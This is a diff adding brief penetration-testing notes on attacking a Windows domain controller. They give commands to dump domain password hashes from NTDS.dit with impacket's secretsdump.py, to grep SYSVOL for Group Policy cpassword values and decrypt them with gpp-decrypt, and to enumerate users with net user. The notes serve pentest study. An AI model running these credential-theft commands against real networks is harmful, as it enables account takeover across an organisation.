@@ -1,0 +1,33 @@
+*************************
+domain controller exploit
+(info from @TinkerSec, March 6, 2019)
+
+*** mounted DC filesystem
+
+grab hashes from NTDS.dit file
+- found in ...\Windows\NTDS\NTDS.dit
+get system hive as well
+- found in ...\Windows\System32\config\SYSTEM
+
+use impacket script, secretsdump.py, to get domain user accounts and hashes from local files:
+python secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL -outputfile lol.hash
+
+secretsdump.py is in the examples directory. There are a lot of useful scripts there
+
+grepped SYSVOL (C:\Windows\SYSVOL\):
+
+~/$ grep -r cpassword *
+
+And found the cipher text for every workstations' Local Admin password. Decrypted it with:
+
+~/$ gpp-decrypt "<cpasswordcipher>"
+
+https://github.com/MichaelGrafnetter/DSInternals
+https://www.dsinternals.com/en/
+
+*** remote access to DC or windows network
+
+get user info
+c:\ net user [username] /domain
+
+
